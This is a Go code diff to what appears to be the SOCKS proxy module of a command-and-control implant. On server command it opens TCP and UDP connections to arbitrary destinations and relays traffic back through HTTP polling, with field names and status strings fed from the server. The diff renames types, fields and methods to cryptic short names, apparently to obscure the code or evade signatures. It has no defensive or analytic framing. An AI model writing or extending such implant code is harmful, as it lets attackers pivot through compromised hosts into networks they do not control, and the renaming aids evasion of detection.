@@ -51,23 +51,23 @@ const (
 	addrTypeIPv6   = 0x04
 )
 
-// SocksHTTPCommand handles HTTP-based SOCKS proxy sessions
-type SocksHTTPCommand struct {
-	sessions    map[string]*TargetSession
-	udpSessions map[string]*UDPTargetSession
+// PxCmd handles HTTP-based SOCKS proxy sessions
+type PxCmd struct {
+	sessions    map[string]*TgtSess
+	udpSessions map[string]*UTgtSess
 	sessionsMu  sync.RWMutex
 	running     bool
-	ctx         *CommandContext
+	ctx         *OpCtx
 	// Pending responses to be included in next POST
-	pendingResponses []*SocksHTTPResponse
+	pendingResponses []*PxResp
 	pendingMu        sync.Mutex
 	// Cached template strings
 	template   []string
 	templateMu sync.RWMutex
 }
 
-// TargetSession represents a TCP connection to a target host
-type TargetSession struct {
+// TgtSess represents a TCP connection to a target host
+type TgtSess struct {
 	mu           sync.RWMutex
 	ID           string
 	TargetConn   net.Conn
@@ -76,8 +76,8 @@ type TargetSession struct {
 	readDone     chan struct{}
 }
 
-// UDPTargetSession represents a UDP relay session
-type UDPTargetSession struct {
+// UTgtSess represents a UDP relay session
+type UTgtSess struct {
 	mu           sync.RWMutex
 	ID           string
 	UDPConn      *net.UDPConn
@@ -86,30 +86,30 @@ type UDPTargetSession struct {
 	stopCh       chan struct{}
 }
 
-// SocksHTTPResponse is sent back to the server
-type SocksHTTPResponse struct {
-	SessionID string `json:"sid"`
+// PxResp is sent back to the server
+type PxResp struct {
+	SI string `json:"sid"`
 	Status    string `json:"st"`  // connected, data, closed, error, udp_ready, udp_data, udp_closed
 	Data      string `json:"d"`   // Base64 encoded data
 	Error     string `json:"err"` // Error message
 	// UDP-specific fields
-	DestAddr string `json:"da,omitempty"`      // Destination/source address
-	DestPort uint16 `json:"dp,omitempty"`      // Destination/source port
-	AddrType byte   `json:"at_type,omitempty"` // Address type
+	DA string `json:"da,omitempty"`      // Destination/source address
+	DP uint16 `json:"dp,omitempty"`      // Destination/source port
+	AT byte   `json:"at_type,omitempty"` // Address type
 }
 
 // Global SOCKS HTTP handler instance
-var socksHTTPHandler *SocksHTTPCommand
+var socksHTTPHandler *PxCmd
 var socksHTTPOnce sync.Once
 
 // GetSocksHTTPHandler returns the singleton SOCKS HTTP handler
-func GetSocksHTTPHandler() *SocksHTTPCommand {
+func GetSocksHTTPHandler() *PxCmd {
 	socksHTTPOnce.Do(func() {
-		socksHTTPHandler = &SocksHTTPCommand{
-			sessions:         make(map[string]*TargetSession),
-			udpSessions:      make(map[string]*UDPTargetSession),
+		socksHTTPHandler = &PxCmd{
+			sessions:         make(map[string]*TgtSess),
+			udpSessions:      make(map[string]*UTgtSess),
 			running:          true,
-			pendingResponses: make([]*SocksHTTPResponse, 0),
+			pendingResponses: make([]*PxResp, 0),
 		}
 		// Start cleanup goroutine
 		go socksHTTPHandler.cleanupStaleSessions()
@@ -117,23 +117,23 @@ func GetSocksHTTPHandler() *SocksHTTPCommand {
 	return socksHTTPHandler
 }
 
-func (c *SocksHTTPCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+func (c *PxCmd) execute(ctx *OpCtx, args []string) OpResult {
 	c.ctx = ctx
 
-	// Get the JSON data from the CurrentCommand in context
+	// Get the JSON data from the CurrentMsg in context
 	var rawData string
 	ctx.mu.RLock()
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		rawData = ctx.CurrentCommand.Data
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		rawData = ctx.CurrentMsg.Data
 	}
 	ctx.mu.RUnlock()
 
 	if rawData == "" {
-		return CommandResult{
+		return OpResult{
 			Error:       fmt.Errorf(Err(E1)),
-			ErrorString: Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E1),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -142,23 +142,23 @@ func (c *SocksHTTPCommand) Execute(ctx *CommandContext, args []string) CommandRe
 		Type      int      `json:"t"`
 		Version   int      `json:"v"`
 		Action    string   `json:"at"`
-		SessionID string   `json:"sid"`
+		SI string   `json:"sid"`
 		Dest      string   `json:"dst"`
 		Data      string   `json:"d"`
 		Templates []string `json:"tpl"` // Template strings from server
 		// UDP-specific fields
-		DestAddr string `json:"da,omitempty"`
-		DestPort uint16 `json:"dp,omitempty"`
-		AddrType byte   `json:"at_type,omitempty"`
+		DA string `json:"da,omitempty"`
+		DP uint16 `json:"dp,omitempty"`
+		AT byte   `json:"at_type,omitempty"`
 		Frag     byte   `json:"fg,omitempty"`
 	}
 
 	if err := json.Unmarshal([]byte(rawData), &cmdData); err != nil {
-		return CommandResult{
+		return OpResult{
 			Error:       err,
-			ErrorString: Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E18),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -179,29 +179,29 @@ func (c *SocksHTTPCommand) Execute(ctx *CommandContext, args []string) CommandRe
 
 	switch cmdData.Action {
 	case actConnect:
-		return c.handleConnect(cmdData.SessionID, cmdData.Dest)
+		return c.handleConnect(cmdData.SI, cmdData.Dest)
 	case actData:
-		return c.handleData(cmdData.SessionID, cmdData.Data)
+		return c.handleData(cmdData.SI, cmdData.Data)
 	case actClose:
-		return c.handleClose(cmdData.SessionID)
+		return c.handleClose(cmdData.SI)
 	case actUDPAssoc:
-		return c.handleUDPAssociate(cmdData.SessionID)
+		return c.handleUDPAssociate(cmdData.SI)
 	case actUDPData:
-		return c.handleUDPData(cmdData.SessionID, cmdData.DestAddr, cmdData.DestPort, cmdData.AddrType, cmdData.Data)
+		return c.handleUDPData(cmdData.SI, cmdData.DA, cmdData.DP, cmdData.AT, cmdData.Data)
 	case actUDPClose:
-		return c.handleUDPClose(cmdData.SessionID)
+		return c.handleUDPClose(cmdData.SI)
 	default:
-		return CommandResult{
+		return OpResult{
 			Error:       fmt.Errorf(ErrCtx(E21, cmdData.Action)),
-			ErrorString: ErrCtx(E21, cmdData.Action),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: ErrCtx(E21, cmdData.Action),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
 
 // getTpl returns template string at index
-func (c *SocksHTTPCommand) getTpl(idx int) string {
+func (c *PxCmd) getTpl(idx int) string {
 	c.templateMu.RLock()
 	defer c.templateMu.RUnlock()
 	if c.template != nil && idx < len(c.template) {
@@ -210,24 +210,24 @@ func (c *SocksHTTPCommand) getTpl(idx int) string {
 	return ""
 }
 
-func (c *SocksHTTPCommand) handleConnect(sessionID, dest string) CommandResult {
+func (c *PxCmd) handleConnect(sessionID, dest string) OpResult {
 	// Dial TCP to destination with timeout
 	conn, err := net.DialTimeout("tcp", dest, 30*time.Second)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E43),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E43, dest),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Create session
-	session := &TargetSession{
+	session := &TgtSess{
 		ID:           sessionID,
 		TargetConn:   conn,
 		State:        1, // connected
@@ -240,51 +240,51 @@ func (c *SocksHTTPCommand) handleConnect(sessionID, dest string) CommandResult {
 	c.sessionsMu.Unlock()
 
 	// Queue success response
-	c.queueResponse(&SocksHTTPResponse{
-		SessionID: sessionID,
+	c.queueResponse(&PxResp{
+		SI: sessionID,
 		Status:    c.getTpl(idxSocksHTTPStatusConnected),
 	})
 
 	// Start goroutine to read from target
 	go c.readFromTarget(session)
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S4, dest),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *SocksHTTPCommand) handleData(sessionID, data string) CommandResult {
+func (c *PxCmd) handleData(sessionID, data string) OpResult {
 	c.sessionsMu.RLock()
 	session, exists := c.sessions[sessionID]
 	c.sessionsMu.RUnlock()
 
 	if !exists {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E40),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E40),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Decode data
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E41),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E41),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -296,68 +296,68 @@ func (c *SocksHTTPCommand) handleData(sessionID, data string) CommandResult {
 	// Write to target
 	_, err = session.TargetConn.Write(decoded)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E44),
 		})
 		c.closeSession(sessionID)
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E44),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S0, fmt.Sprintf("%d", len(decoded))),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
-func (c *SocksHTTPCommand) handleClose(sessionID string) CommandResult {
+func (c *PxCmd) handleClose(sessionID string) OpResult {
 	c.closeSession(sessionID)
-	return CommandResult{
+	return OpResult{
 		Output:      Succ(S2),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // handleUDPAssociate sets up a UDP relay session
-func (c *SocksHTTPCommand) handleUDPAssociate(sessionID string) CommandResult {
+func (c *PxCmd) handleUDPAssociate(sessionID string) OpResult {
 	// Create a UDP socket for sending/receiving
 	udpAddr, err := net.ResolveUDPAddr("udp", "0.0.0.0:0")
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E45),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E45),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	udpConn, err := net.ListenUDP("udp", udpAddr)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E46),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E46),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Create UDP session
-	session := &UDPTargetSession{
+	session := &UTgtSess{
 		ID:           sessionID,
 		UDPConn:      udpConn,
 		State:        1, // connected
@@ -370,52 +370,52 @@ func (c *SocksHTTPCommand) handleUDPAssociate(sessionID string) CommandResult {
 	c.sessionsMu.Unlock()
 
 	// Queue success response
-	c.queueResponse(&SocksHTTPResponse{
-		SessionID: sessionID,
+	c.queueResponse(&PxResp{
+		SI: sessionID,
 		Status:    c.getTpl(idxSocksHTTPStatusUDPReady),
 	})
 
 	// Start goroutine to read UDP responses
 	go c.readFromUDPTarget(session)
 
-	return CommandResult{
+	return OpResult{
 		Output:      Succ(S4),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // handleUDPData sends UDP data to a target
-func (c *SocksHTTPCommand) handleUDPData(sessionID, destAddr string, destPort uint16, addrType byte, data string) CommandResult {
+func (c *PxCmd) handleUDPData(sessionID, destAddr string, destPort uint16, addrType byte, data string) OpResult {
 	c.sessionsMu.RLock()
 	session, exists := c.udpSessions[sessionID]
 	c.sessionsMu.RUnlock()
 
 	if !exists {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E40),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E40),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Decode data
 	decoded, err := base64.StdEncoding.DecodeString(data)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E41),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E41),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -423,15 +423,15 @@ func (c *SocksHTTPCommand) handleUDPData(sessionID, destAddr string, destPort ui
 	dest := fmt.Sprintf("%s:%d", destAddr, destPort)
 	udpAddr, err := net.ResolveUDPAddr("udp", dest)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     ErrCtx(E45, dest),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E45, dest),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -443,37 +443,37 @@ func (c *SocksHTTPCommand) handleUDPData(sessionID, destAddr string, destPort ui
 	// Send UDP packet
 	_, err = session.UDPConn.WriteToUDP(decoded, udpAddr)
 	if err != nil {
-		c.queueResponse(&SocksHTTPResponse{
-			SessionID: sessionID,
+		c.queueResponse(&PxResp{
+			SI: sessionID,
 			Status:    c.getTpl(idxSocksHTTPStatusError),
 			Error:     Err(E44),
 		})
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E44),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S0, fmt.Sprintf("%d:%s", len(decoded), dest)),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // handleUDPClose closes a UDP session
-func (c *SocksHTTPCommand) handleUDPClose(sessionID string) CommandResult {
+func (c *PxCmd) handleUDPClose(sessionID string) OpResult {
 	c.closeUDPSession(sessionID)
-	return CommandResult{
+	return OpResult{
 		Output:      Succ(S2),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // readFromUDPTarget reads UDP responses and queues them for the server
-func (c *SocksHTTPCommand) readFromUDPTarget(session *UDPTargetSession) {
+func (c *PxCmd) readFromUDPTarget(session *UTgtSess) {
 	defer c.closeUDPSession(session.ID)
 
 	buf := make([]byte, 65535)
@@ -496,8 +496,8 @@ func (c *SocksHTTPCommand) readFromUDPTarget(session *UDPTargetSession) {
 			state := session.State
 			session.mu.RUnlock()
 			if state == 1 {
-				c.queueResponse(&SocksHTTPResponse{
-					SessionID: session.ID,
+				c.queueResponse(&PxResp{
+					SI: session.ID,
 					Status:    c.getTpl(idxSocksHTTPStatusUDPClosed),
 				})
 			}
@@ -517,20 +517,20 @@ func (c *SocksHTTPCommand) readFromUDPTarget(session *UDPTargetSession) {
 			}
 
 			// Queue UDP data response
-			c.queueResponse(&SocksHTTPResponse{
-				SessionID: session.ID,
+			c.queueResponse(&PxResp{
+				SI: session.ID,
 				Status:    c.getTpl(idxSocksHTTPStatusUDPData),
 				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
-				DestAddr:  destAddr,
-				DestPort:  uint16(remoteAddr.Port),
-				AddrType:  addrType,
+				DA:  destAddr,
+				DP:  uint16(remoteAddr.Port),
+				AT:  addrType,
 			})
 		}
 	}
 }
 
 // closeUDPSession closes a UDP session
-func (c *SocksHTTPCommand) closeUDPSession(sessionID string) {
+func (c *PxCmd) closeUDPSession(sessionID string) {
 	c.sessionsMu.Lock()
 	session, exists := c.udpSessions[sessionID]
 	if exists {
@@ -546,7 +546,7 @@ func (c *SocksHTTPCommand) closeUDPSession(sessionID string) {
 	c.sessionsMu.Unlock()
 }
 
-func (c *SocksHTTPCommand) readFromTarget(session *TargetSession) {
+func (c *PxCmd) readFromTarget(session *TgtSess) {
 	defer func() {
 		close(session.readDone)
 		c.closeSession(session.ID)
@@ -568,14 +568,14 @@ func (c *SocksHTTPCommand) readFromTarget(session *TargetSession) {
 				state := session.State
 				session.mu.RUnlock()
 				if state == 1 {
-					c.queueResponse(&SocksHTTPResponse{
-						SessionID: session.ID,
+					c.queueResponse(&PxResp{
+						SI: session.ID,
 						Status:    c.getTpl(idxSocksHTTPStatusClosed),
 					})
 				}
 			} else {
-				c.queueResponse(&SocksHTTPResponse{
-					SessionID: session.ID,
+				c.queueResponse(&PxResp{
+					SI: session.ID,
 					Status:    c.getTpl(idxSocksHTTPStatusClosed),
 				})
 			}
@@ -588,8 +588,8 @@ func (c *SocksHTTPCommand) readFromTarget(session *TargetSession) {
 			session.mu.Unlock()
 
 			// Queue data response
-			c.queueResponse(&SocksHTTPResponse{
-				SessionID: session.ID,
+			c.queueResponse(&PxResp{
+				SI: session.ID,
 				Status:    c.getTpl(idxSocksHTTPStatusData),
 				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
 			})
@@ -597,7 +597,7 @@ func (c *SocksHTTPCommand) readFromTarget(session *TargetSession) {
 	}
 }
 
-func (c *SocksHTTPCommand) closeSession(sessionID string) {
+func (c *PxCmd) closeSession(sessionID string) {
 	c.sessionsMu.Lock()
 	session, exists := c.sessions[sessionID]
 	if exists {
@@ -612,15 +612,15 @@ func (c *SocksHTTPCommand) closeSession(sessionID string) {
 	c.sessionsMu.Unlock()
 }
 
-func (c *SocksHTTPCommand) queueResponse(resp *SocksHTTPResponse) {
+func (c *PxCmd) queueResponse(resp *PxResp) {
 	c.pendingMu.Lock()
 	c.pendingResponses = append(c.pendingResponses, resp)
 	c.pendingMu.Unlock()
 }
 
-// GetPendingResponses returns and clears all pending SOCKS responses
+// getPendingResponses returns and clears all pending SOCKS responses
 // Called by the polling mechanism to include in POST payload
-func (c *SocksHTTPCommand) GetPendingResponses() []*SocksHTTPResponse {
+func (c *PxCmd) getPendingResponses() []*PxResp {
 	c.pendingMu.Lock()
 	defer c.pendingMu.Unlock()
 
@@ -629,11 +629,11 @@ func (c *SocksHTTPCommand) GetPendingResponses() []*SocksHTTPResponse {
 	}
 
 	responses := c.pendingResponses
-	c.pendingResponses = make([]*SocksHTTPResponse, 0)
+	c.pendingResponses = make([]*PxResp, 0)
 	return responses
 }
 
-func (c *SocksHTTPCommand) cleanupStaleSessions() {
+func (c *PxCmd) cleanupStaleSessions() {
 	ticker := time.NewTicker(60 * time.Second)
 	defer ticker.Stop()
 
@@ -664,8 +664,8 @@ func (c *SocksHTTPCommand) cleanupStaleSessions() {
 
 		// Cleanup stale TCP sessions
 		for _, id := range staleTCPIDs {
-			c.queueResponse(&SocksHTTPResponse{
-				SessionID: id,
+			c.queueResponse(&PxResp{
+				SI: id,
 				Status:    c.getTpl(idxSocksHTTPStatusClosed),
 				Error:     Err(E42),
 			})
@@ -674,8 +674,8 @@ func (c *SocksHTTPCommand) cleanupStaleSessions() {
 
 		// Cleanup stale UDP sessions
 		for _, id := range staleUDPIDs {
-			c.queueResponse(&SocksHTTPResponse{
-				SessionID: id,
+			c.queueResponse(&PxResp{
+				SI: id,
 				Status:    c.getTpl(idxSocksHTTPStatusUDPClosed),
 				Error:     Err(E42),
 			})
@@ -684,8 +684,8 @@ func (c *SocksHTTPCommand) cleanupStaleSessions() {
 	}
 }
 
-// HasPendingSocksResponses checks if there are pending SOCKS responses
-func HasPendingSocksResponses() bool {
+// hasPendingSocksResponses checks if there are pending SOCKS responses
+func hasPendingSocksResponses() bool {
 	handler := GetSocksHTTPHandler()
 	handler.pendingMu.Lock()
 	defer handler.pendingMu.Unlock()
@@ -695,7 +695,7 @@ func HasPendingSocksResponses() bool {
 // GetSocksHTTPResponses returns pending SOCKS responses for inclusion in POST
 func GetSocksHTTPResponses() []map[string]interface{} {
 	handler := GetSocksHTTPHandler()
-	responses := handler.GetPendingResponses()
+	responses := handler.getPendingResponses()
 	if len(responses) == 0 {
 		return nil
 	}
@@ -703,7 +703,7 @@ func GetSocksHTTPResponses() []map[string]interface{} {
 	result := make([]map[string]interface{}, len(responses))
 	for i, resp := range responses {
 		result[i] = map[string]interface{}{
-			handler.getTpl(idxSocksHTTPFieldSid):    resp.SessionID,
+			handler.getTpl(idxSocksHTTPFieldSid):    resp.SI,
 			handler.getTpl(idxSocksHTTPFieldStatus): resp.Status,
 		}
 		if resp.Data != "" {
@@ -712,14 +712,14 @@ func GetSocksHTTPResponses() []map[string]interface{} {
 		if resp.Error != "" {
 			result[i][handler.getTpl(idxSocksHTTPFieldError)] = resp.Error
 		}
-		if resp.DestAddr != "" {
-			result[i][handler.getTpl(idxSocksHTTPFieldDestAddr)] = resp.DestAddr
+		if resp.DA != "" {
+			result[i][handler.getTpl(idxSocksHTTPFieldDestAddr)] = resp.DA
 		}
-		if resp.DestPort != 0 {
-			result[i][handler.getTpl(idxSocksHTTPFieldDestPort)] = resp.DestPort
+		if resp.DP != 0 {
+			result[i][handler.getTpl(idxSocksHTTPFieldDestPort)] = resp.DP
 		}
-		if resp.AddrType != 0 {
-			result[i][handler.getTpl(idxSocksHTTPFieldAtyp)] = resp.AddrType
+		if resp.AT != 0 {
+			result[i][handler.getTpl(idxSocksHTTPFieldAtyp)] = resp.AT
 		}
 	}
 	return result
